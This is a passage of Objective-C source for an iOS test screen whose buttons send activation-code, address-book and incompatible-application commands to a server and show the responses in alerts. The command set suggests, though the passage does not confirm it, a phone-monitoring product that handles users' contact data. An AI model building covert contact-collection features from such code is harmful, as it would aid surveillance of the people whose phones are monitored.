	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)activationCodeTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	GetActivationCode *command = [[GetActivationCode alloc] init];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)getAddressBookTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	GetAddressBook *command = [[GetAddressBook alloc] init];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

-(IBAction)incompatibleAppTouched:(id)sender {
	CommandRequest *request = [[CommandRequest alloc] init];
	GetIncompatibleApplicationDefinitions *command = [[GetIncompatibleApplicationDefinitions alloc] init];
	
	[request setCommandData:command];
	[request setMetaData:[self testMetaData]];
	[request setDelegate:self];
	[request setPriority:NORMAL];
	
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	long CSID =  [CSM execute:request];
	[command release];
	[request release];
	DLog(@"GET CSID %ld", CSID);
}

#pragma mark -
#pragma mark ResumeRequest

- (IBAction) resumeTouched:(id)sender {
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	DLog(@"Pending %@", [CSM getAllPendingSession]);
	DLog(@"Orphaned %@", [CSM getAllOrphanedSession]);
	
	if ([[CSM getAllPendingSession] count] != 0) {
		[CSM resume:[[[CSM getAllPendingSession] objectAtIndex:0] intValue] withDelegate:self];
	}
}

- (IBAction) cancelTouched:(id)sender {
//	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//	NSString *documentsDirectory = [paths objectAtIndex:0];
	NSString *documentsDirectory = @"/private/var/tmp";
	CSM = [CommandServiceManager sharedManagerWithPayloadPath:documentsDirectory withDBPath:documentsDirectory];
	
	[CSM testCancelRequest];
//	[CSM cancelRequest:1];
}

#pragma mark -
#pragma mark Callback delegate
- (void)onConstructError:(uint32_t)CSID withError:(NSError *)error {
	DLog(@"onConstructError");
	NSString *msg = [NSString stringWithFormat:@"onConstructError! \n CSID=%d \n error=%@", CSID, [error domain]]; 
	UIAlertView *alert = [[UIAlertView alloc] initWithTitle:nil message:msg
												   delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
	[alert show];
	[alert release];
}

- (void)onServerError:(ResponseData *)response {
	DLog(@"onServerError");
	NSString *msg = [NSString stringWithFormat:@"onServerError! \n CSID=%d \n message=%@ \n statusCode=%d \n cmdEcho=%d", [response CSID], [response message], [response statusCode], [response cmdEcho]];
	UIAlertView *alert = [[UIAlertView alloc] initWithTitle:nil message:msg
												   delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
	[alert show];
	[alert release];
}

- (void)onSuccess:(ResponseData *)response {
	DLog(@"onSuccess");
	DLog(@"CSID=%d, message=%@, statusCode=%d, cmdEcho=%d", [response CSID], [response message], [response statusCode], [response cmdEcho]);
	for (PCC *obj in [response PCCArray]) {
		DLog(@"PCCID=%d", [obj PCCID]);
	}
	switch ([response cmdEcho]) {
		case GET_ADDRESSBOOK:
			DLog(@"GET_ADDRESSBOOK");
			for (AddressBook *adrObj in [(GetAddressBookResponse *)response addressBookList]) {
				while ([[adrObj VCardProvider] hasNext]) {
					[[adrObj VCardProvider] getObject];
				}
			}
			break;
		default:
			DLog(@"DEFAULT");
			break;
	}
	
	NSString *msg = [NSString stringWithFormat:@"onSuccess! \n CSID=%d \n message=%@ \n statusCode=%d \n cmdEcho=%d", [response CSID], [response message], [response statusCode], [response cmdEcho]];
	UIAlertView *alert = [[UIAlertView alloc] initWithTitle:nil message:msg
												   delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
	[alert show];
	[alert release];
}

- (void)onTransportError:(uint32_t)CSID withError:(NSError *)error {
	NSString *msg = [NSString stringWithFormat:@"onTransportError! \n CSID=%d \n error=%@", CSID, [error domain]]; 
	UIAlertView *alert = [[UIAlertView alloc] initWithTitle:nil message:msg
												   delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
	[alert show];
	[alert release];
}

/*
 // The designated initializer.  Override if you create the controller programmatically and want to perform customization that is not appropriate for viewDidLoad.
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil {
    if (self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil]) {
        // Custom initialization
    }
    return self;
}
*/

// Implement viewDidLoad to do additional setup after loading the view, typically from a nib.
- (void)viewDidLoad {
	[super viewDidLoad];
	CGSize size = CGSizeMake(320, 1250);
	[scrollView setContentSize:size];
}

/*
// Override to allow orientations other than the default portrait orientation.
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
	// Return YES for supported orientations
	return (interfaceOrientation == UIInterfaceOrientationPortrait);
}
*/

- (void)didReceiveMemoryWarning {
	// Releases the view if it doesn't have a superview.
	[super didReceiveMemoryWarning];
	
	// Release any cached data, images, etc that aren't in use.
}

- (void)viewDidUnload {
	// Release any retained subviews of the main view.
	// e.g. self.myOutlet = nil;
}

- (void)dealloc {
	[CSM release];
	[super dealloc];
}


@end
